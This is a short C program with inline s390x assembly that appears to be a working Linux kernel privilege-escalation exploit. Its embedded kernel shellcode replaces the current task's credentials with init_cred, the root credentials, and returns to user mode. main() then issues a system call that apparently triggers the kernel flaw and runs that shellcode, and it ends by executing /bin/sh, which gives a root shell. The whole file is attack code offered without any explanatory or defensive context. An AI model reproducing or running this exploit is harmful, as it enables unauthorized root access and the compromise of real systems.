extern const char kernel_shellcode[];
asm(".globl kernel_shellcode\n"
    "kernel_shellcode:\n"
    "lg %r1, 0x340\n"                 /* current_task */
    "lg %r0, 0x1c8\n"                 /* svc_new_psw + 8 */
    "agfi %r0, 0x4FD8C8 - 0x3DBA70\n" /* init_cred - system_call */
    "stg %r0, 0x808(%r1)\n"           /* current_task->real_cred = init_cred */
    "stg %r0, 0x810(%r1)\n"           /* current_task->cred = init_cred */
    "lctlg %c1, %c1, 0x390\n"         /* user_asce */
    "lpswe 0x140\n");                 /* svc_old_psw */

char execve_pathname[] = "/bin/sh";
char *execve_argv[] = {execve_pathname, 0};
char *execve_envp[] = {0};

int main(void) {
  asm("lmg %%r8, %%r15, %0\n"
      "lghi %%r1, 390\n"
      "lghi %%r2, 0x200\n" /* save_area_sync */
      "svc 0\n"
      "larl %%r2, execve_pathname\n"
      "larl %%r3, execve_argv\n"
      "larl %%r4, execve_envp\n"
      "svc 11\n" /* __NR_execve */
      :
      : "m"(kernel_shellcode));
  __builtin_unreachable();
}
